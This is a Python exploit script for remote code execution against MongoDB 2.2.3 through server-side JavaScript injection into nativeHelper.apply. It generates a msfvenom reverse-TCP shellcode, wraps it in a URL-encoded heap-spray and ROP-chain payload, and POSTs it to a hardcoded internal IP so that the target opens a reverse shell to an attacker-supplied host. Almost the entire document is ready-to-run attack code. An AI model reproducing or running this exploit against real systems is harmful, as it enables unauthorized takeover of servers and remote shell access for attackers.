# Title: MongoDB nativeHelper.apply Remote Code Execution
# Author: agixid http://blog.scrt.ch/2013/03/24/mongodb-0-day-ssji-to-rce/
# Software Link: http://fastdl.mongodb.org/linux/mongodb-linux-i686-2.2.3.tgz
# Version: 2.2.3

# Automated by Emil Andrzejewski (https://github.com/em1c)

import requests
import urllib3
import os
import urllib.parse

requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = 'ALL:@SECLEVEL=1'

# Preparing payload
print("MongoDB nativeHelper.apply Remote Code Execution")
print("================================================")
print("     Start your listener before proceeding!")
print("================================================")

lhost = input("[+] LHOST: ")
lport = input("[+] LPORT: ")

print("\n")

print("[+] Generating msfvenom payload...")
os.system(f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f js_le > shellcode.js")

with open('shellcode.js', 'r') as file:
	shellcode = file.read()

payload = f"%27%3b%73%68%65%6c%6c%63%6f%64%65%3d%75%6e%65%73%63%61%70%65%28%22{shellcode}%22%29%3b%20%73%69%7a%65%63%68%75%6e%6b%3d%30%78%31%30%30%30%3b%20%63%68%75%6e%6b%3d%22%22%3b%20%66%6f%72%28%69%3d%30%3b%69%3c%73%69%7a%65%63%68%75%6e%6b%3b%69%2b%2b%29%7b%20%63%68%75%6e%6b%2b%3d%75%6e%65%73%63%61%70%65%28%22%25%75%39%30%39%30%25%75%39%30%39%30%22%29%3b%20%7d%20%63%68%75%6e%6b%3d%63%68%75%6e%6b%2e%73%75%62%73%74%72%69%6e%67%28%30%2c%28%73%69%7a%65%63%68%75%6e%6b%2d%73%68%65%6c%6c%63%6f%64%65%2e%6c%65%6e%67%74%68%29%29%3b%20%74%65%73%74%61%72%72%61%79%3d%6e%65%77%20%41%72%72%61%79%28%29%3b%20%66%6f%72%28%69%3d%30%3b%69%3c%32%35%30%30%30%3b%69%2b%2b%29%7b%20%74%65%73%74%61%72%72%61%79%5b%69%5d%3d%63%68%75%6e%6b%2b%73%68%65%6c%6c%63%6f%64%65%3b%20%7d%20%72%6f%70%63%68%61%69%6e%3d%75%6e%65%73%63%61%70%65%28%22%25%75%66%37%36%38%25%75%30%38%31%36%25%75%30%63%30%63%25%75%30%63%30%63%25%75%30%30%30%30%25%75%30%63%30%63%25%75%31%30%30%30%25%75%30%30%30%30%25%75%30%30%30%37%25%75%30%30%30%30%25%75%30%30%33%31%25%75%30%30%30%30%25%75%66%66%66%66%25%75%66%66%66%66%25%75%30%30%30%30%25%75%30%30%30%30%22%29%3b%20%73%69%7a%65%63%68%75%6e%6b%32%3d%30%78%31%30%30%30%3b%20%63%68%75%6e%6b%32%3d%22%22%3b%20%66%6f%72%28%69%3d%30%3b%69%3c%73%69%7a%65%63%68%75%6e%6b%32%3b%69%2b%2b%29%7b%20%63%68%75%6e%6b%32%2b%3d%75%6e%65%73%63%61%70%65%28%22%25%75%35%61%37%30%25%75%30%38%30%35%22%29%3b%20%7d%20%63%68%75%6e%6b%32%3d%63%68%75%6e%6b%32%2e%73%75%62%73%74%72%69%6e%67%28%30%2c%28%73%69%7a%65%63%68%75%6e%6b%32%2d%72%6f%70%63%68%61%69%6e%2e%6c%65%6e%67%74%68%29%29%3b%20%74%65%73%74%61%72%72%61%79%32%3d%6e%65%77%20%41%72%72%61%79%28%29%3b%20%66%6f%72%28%69%3d%30%3b%69%3c%32%35%30%30%30%3b%69%2b%2b%29%7b%20%74%65%73%74%61%72%72%61%79%32%5b%69%5d%3d%63%68%75%6e%6b%32%2b%72%6f%70%63%68%61%69%6e%3b%20%7d%20%6e%61%74%69%76%65%48%65%6c%70%65%72%2e%61%70%70%6c%79%28%7b%22%78%22%20%3a%20%30%78%38%33%36%65%32%30%34%7d%2c%20%5b%22%41%22%2b%22%5c%78%32%36%5c%78%31%38%5c%78%33%35%5c%78%30%38%22%2b%22%4d%6f%6e%67%6f%53%70%6c%6f%69%74%21%22%2b%22%5c%78%35%38%5c%78%37%31%5c%78%34%35%5c%78%30%38%22%2b%22%73%74%68%61%63%6b%20%69%73%20%61%20%6e%69%63%65%20%70%6c%61%63%65%20%74%6f%20%62%65%22%2b%22%5c%78%36%63%5c%78%35%61%5c%78%30%35%5c%78%30%38%22%2b%22%5c%78%32%30%5c%78%32%30%5c%78%32%30%5c%78%32%30%22%2b%22%5c%78%35%38%5c%78%37%31%5c%78%34%35%5c%78%30%38%22%5d%29%3b%27"

print("\n")

# Request
print("[+] Sending payload...")
url = 'https://10.11.1.237:443/cgi-bin/mongo/2.2.3/dbparse.py'

print("\n")

print("[*] You should get a reverse shell now!")

print("\n")

exploit = requests.post(url, data='CompanyName=' + payload, verify=False)